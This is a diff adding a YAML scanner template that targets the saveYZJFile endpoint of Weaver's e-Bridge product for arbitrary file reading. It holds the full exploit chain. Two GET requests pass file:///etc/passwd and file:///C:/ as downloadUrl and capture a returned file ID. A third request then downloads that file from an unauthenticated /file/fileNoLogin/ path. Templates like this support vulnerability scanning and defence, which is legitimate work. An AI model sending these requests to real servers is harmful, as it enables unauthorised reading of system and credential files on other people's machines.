@@ -1,0 +1,28 @@
+name: 泛微云桥e-Bridge-saveYZJFile文件读取
+description: >
+  任意文件读取
+alwaysExecute: false
+matchCount: 2
+rules:   
+  - method: GET
+    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
+    search: |
+      "id": "(?P<ID>[A-Za-z0-9+/=]+)"
+    expression:
+      status: 200
+      body_all:
+        - "id"
+        - "filepath"
+  - method: GET
+    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
+    search: |
+      "id": "(?P<ID>[A-Za-z0-9+/=]+)"
+    expression:
+      status: 200
+      body_all:
+        - "id"
+        - "filepath"
+  - method: GET
+    path: /file/fileNoLogin/{{ID}}
+    expression:
+      status: 200
